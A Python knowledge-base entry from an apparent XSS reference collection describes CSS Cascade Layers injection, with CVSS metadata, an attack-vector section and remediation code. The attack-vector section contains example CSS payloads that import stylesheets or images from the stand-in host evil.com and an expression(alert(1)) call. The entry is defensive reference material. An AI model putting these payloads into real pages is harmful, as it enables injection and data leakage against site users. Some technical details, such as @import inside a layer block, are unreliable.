#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Knowledge Base: CSS Cascade Layers XSS
"""

DETAILS = {
    "title": "Cross-Site Scripting (XSS) via CSS Cascade Layers",
    "severity": "medium",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["xss", "css", "cascade-layers", "@layer", "chrome-99"],
    "description": """
CSS Cascade Layers (@layer) allow controlling CSS specificity. XSS vulnerabilities occur when
user input controls layer names or layer content without validation.

SEVERITY: MEDIUM
Can lead to CSS injection and style-based attacks. Layer names can be used for CSS injection.
""",
    "attack_vector": """
CASCADE LAYER NAME INJECTION:
@layer ${userInput} {
  body { background: url('//evil.com/xss'); }
}

CASCADE LAYER CONTENT INJECTION:
@layer base {
  ${userInput}  // XSS if userInput contains CSS with expression() or @import
}

CASCADE LAYER IMPORT:
@import url('//evil.com/xss.css') layer(${userInput});

CASCADE LAYER WITH EXPRESSION:
@layer base {
  body {
    background: expression(alert(1));  // IE only, but still dangerous
  }
}

CASCADE LAYER WITH @IMPORT:
@layer base {
  @import url('//evil.com/xss.css');
}
""",
    "remediation": """
DEFENSE:

1. Validate layer names (alphanumeric and hyphens only)
2. Sanitize CSS content before injection
3. Block @import in user-controlled CSS
4. Block expression() and javascript: URLs
5. Implement CSP style-src

SAFE PATTERN:
function validateLayerName(name) {
  if (!/^[a-z0-9-]+$/i.test(name)) {
    throw new Error('Invalid layer name');
  }
  return name;
}
@layer ${validateLayerName(userInput)} { }

CSS SANITIZATION:
import { sanitize } from 'css-sanitize';
const safeCSS = sanitize(userInput);
style.textContent = safeCSS;

OWASP REFERENCES:
- CWE-79: Cross-site Scripting
- CSS Cascade Layers Specification
""",
}
